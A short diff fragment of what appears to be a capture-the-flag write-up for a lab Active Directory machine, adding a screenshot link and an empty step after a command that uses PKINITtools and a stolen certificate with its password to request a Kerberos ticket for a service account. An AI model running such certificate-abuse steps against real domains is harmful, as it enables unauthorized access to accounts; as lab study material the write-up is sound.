@@ -199,4 +199,6 @@ So our first course of action is to add our `p.agila` user to the SERVICE ACCOUN
 
 `python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx winrm_svc.pfx -pfx-pass 'P@ssw0rd!' fluffy.htb/winrm_svc -dc-ip 10.129.232.88 winrm_svc.ccache`
 
+<img width="1064" height="289" alt="image" src="https://github.com/user-attachments/assets/c60abd17-cfbf-49f8-bb44-32d4ffcdfb34" />
 
+15. 
